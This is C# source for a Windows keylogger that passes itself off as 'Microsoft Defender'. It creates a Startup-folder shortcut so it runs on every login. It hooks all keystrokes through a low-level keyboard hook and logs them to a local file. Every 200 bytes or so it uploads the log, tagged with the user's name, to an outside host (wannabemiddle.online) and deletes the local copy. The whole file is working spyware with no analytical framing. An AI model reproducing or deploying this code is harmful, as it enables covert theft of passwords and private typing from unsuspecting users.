using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Http;
using Microsoft.VisualBasic.Devices;
using IWshRuntimeLibrary;

namespace Microsoft_Defender
{
    public partial class Form1 : Form
    {
        static Dictionary<int, char> englishLowercaseDict = new Dictionary<int, char>();
        static Dictionary<int, char> englishUppercaseDict = new Dictionary<int, char>();
        static HttpClient httpClient = new HttpClient();
        public Form1()
        {
            InitializeComponent();
            fillEnglishDict();
            var ShortcutPath = Environment.CurrentDirectory + @"\Microsoft Defender.lnk";
            string TargetPath = Environment.CurrentDirectory + @"\Microsoft Defender.exe";
            WshShell wshShell = new WshShell();

            string user = Environment.UserName;

            string[] Drives = Environment.GetLogicalDrives();

            foreach (string s in Drives)
            {
                string path = s + @"Users\" + user + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
                if (Directory.Exists(path))
                {
                    ShortcutPath = path + @"\Microsoft Defender.lnk";
                }
            }

            IWshShortcut Shortcut = (IWshShortcut)wshShell.
                CreateShortcut(ShortcutPath);

            Shortcut.TargetPath = TargetPath;

            Shortcut.Save();
        }

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;

        private LowLevelKeyboardProc _proc = hookProc;

        private static IntPtr hhook = IntPtr.Zero;

        public void SetHook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
        }

        public static void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }

        public static IntPtr hookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                string inputLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
                int vkCode = Marshal.ReadInt32(lParam);
                Keyboard keyboard = new Keyboard();
                var isShiftPressed = keyboard.ShiftKeyDown;
                var pressedButton = "";

                try
                {
                    if (isShiftPressed)
                    {
                        pressedButton = englishUppercaseDict[vkCode].ToString();
                    }
                    else
                    {
                        pressedButton = englishLowercaseDict[vkCode].ToString();
                    }
                }
                catch (Exception exception)
                {
                    pressedButton = "{SPEC_BUTTON}";
                }
                writeButtonToFile(pressedButton);
                var fileLength = new FileInfo(Environment.CurrentDirectory + @"\Buttons.txt").Length;
                if (fileLength > 200)
                {
                    send();
                    System.IO.File.Delete(Environment.CurrentDirectory + @"\Buttons.txt");
                }
                return (IntPtr)0;
            }
            else
                return CallNextHookEx(hhook, code, (int)wParam, lParam);
        }

        private void Form1_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            UnHook();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SetHook();
        }

        public void fillEnglishDict()
        {
            englishLowercaseDict.Add(81, 'q');
            englishLowercaseDict.Add(87, 'w');
            englishLowercaseDict.Add(69, 'e');
            englishLowercaseDict.Add(82, 'r');
            englishLowercaseDict.Add(84, 't');
            englishLowercaseDict.Add(89, 'y');
            englishLowercaseDict.Add(85, 'u');
            englishLowercaseDict.Add(73, 'i');
            englishLowercaseDict.Add(79, 'o');
            englishLowercaseDict.Add(80, 'p');
            englishLowercaseDict.Add(219, '[');
            englishLowercaseDict.Add(221, ']');
            englishLowercaseDict.Add(65, 'a');
            englishLowercaseDict.Add(83, 's');
            englishLowercaseDict.Add(68, 'd');
            englishLowercaseDict.Add(70, 'f');
            englishLowercaseDict.Add(71, 'g');
            englishLowercaseDict.Add(72, 'h');
            englishLowercaseDict.Add(74, 'j');
            englishLowercaseDict.Add(75, 'k');
            englishLowercaseDict.Add(76, 'l');
            englishLowercaseDict.Add(186, ';');
            englishLowercaseDict.Add(222, '\'');
            englishLowercaseDict.Add(192, '`');
            englishLowercaseDict.Add(90, 'z');
            englishLowercaseDict.Add(88, 'x');
            englishLowercaseDict.Add(67, 'c');
            englishLowercaseDict.Add(86, 'v');
            englishLowercaseDict.Add(66, 'b');
            englishLowercaseDict.Add(78, 'n');
            englishLowercaseDict.Add(77, 'm');
            englishLowercaseDict.Add(188, ',');
            englishLowercaseDict.Add(190, '.');
            englishLowercaseDict.Add(191, '/');
            englishLowercaseDict.Add(220, '\\');
            englishLowercaseDict.Add(49, '1');
            englishLowercaseDict.Add(50, '2');
            englishLowercaseDict.Add(51, '3');
            englishLowercaseDict.Add(52, '4');
            englishLowercaseDict.Add(53, '5');
            englishLowercaseDict.Add(54, '6');
            englishLowercaseDict.Add(55, '7');
            englishLowercaseDict.Add(56, '8');
            englishLowercaseDict.Add(57, '9');
            englishLowercaseDict.Add(48, '0');
            englishLowercaseDict.Add(189, '-');
            englishLowercaseDict.Add(187, '=');

            englishUppercaseDict.Add(81, 'Q');
            englishUppercaseDict.Add(87, 'W');
            englishUppercaseDict.Add(69, 'E');
            englishUppercaseDict.Add(82, 'R');
            englishUppercaseDict.Add(84, 'T');
            englishUppercaseDict.Add(89, 'Y');
            englishUppercaseDict.Add(85, 'U');
            englishUppercaseDict.Add(73, 'I');
            englishUppercaseDict.Add(79, 'O');
            englishUppercaseDict.Add(80, 'P');
            englishUppercaseDict.Add(219, '{');
            englishUppercaseDict.Add(221, '}');
            englishUppercaseDict.Add(65, 'A');
            englishUppercaseDict.Add(83, 'S');
            englishUppercaseDict.Add(68, 'D');
            englishUppercaseDict.Add(70, 'F');
            englishUppercaseDict.Add(71, 'G');
            englishUppercaseDict.Add(72, 'H');
            englishUppercaseDict.Add(74, 'J');
            englishUppercaseDict.Add(75, 'K');
            englishUppercaseDict.Add(76, 'L');
            englishUppercaseDict.Add(186, ':');
            englishUppercaseDict.Add(222, '"');
            englishUppercaseDict.Add(192, '~');
            englishUppercaseDict.Add(90, 'Z');
            englishUppercaseDict.Add(88, 'X');
            englishUppercaseDict.Add(67, 'C');
            englishUppercaseDict.Add(86, 'V');
            englishUppercaseDict.Add(66, 'B');
            englishUppercaseDict.Add(78, 'N');
            englishUppercaseDict.Add(77, 'M');
            englishUppercaseDict.Add(188, '<');
            englishUppercaseDict.Add(190, '>');
            englishUppercaseDict.Add(191, '?');
            englishUppercaseDict.Add(220, '|');
            englishUppercaseDict.Add(49, '!');
            englishUppercaseDict.Add(50, '@');
            englishUppercaseDict.Add(51, '#');
            englishUppercaseDict.Add(52, '$');
            englishUppercaseDict.Add(53, '%');
            englishUppercaseDict.Add(54, '^');
            englishUppercaseDict.Add(55, '&');
            englishUppercaseDict.Add(56, '*');
            englishUppercaseDict.Add(57, '(');
            englishUppercaseDict.Add(48, ')');
            englishUppercaseDict.Add(189, '_');
            englishUppercaseDict.Add(187, '+');
        }

        static void writeButtonToFile(string button)
        {
            StreamWriter file = new StreamWriter(Environment.CurrentDirectory + @"\Buttons.txt", true, System.Text.Encoding.Unicode);
            file.Write(button);
            file.Close();
        }

        static void send()
        {
            using (var multipartFormContent = new MultipartFormDataContent())
            {
                var fileStreamContent = new StreamContent(System.IO.File.OpenRead(Environment.CurrentDirectory + @"\Buttons.txt"));
                multipartFormContent.Add(fileStreamContent, name: "file", fileName: "button.txt");
                var response = httpClient.PostAsync("http://wannabemiddle.online/keylogging/" + Environment.UserName, multipartFormContent);
                var result = response.Result.Content.ReadAsStringAsync().Result;
            }
        }
    }
}


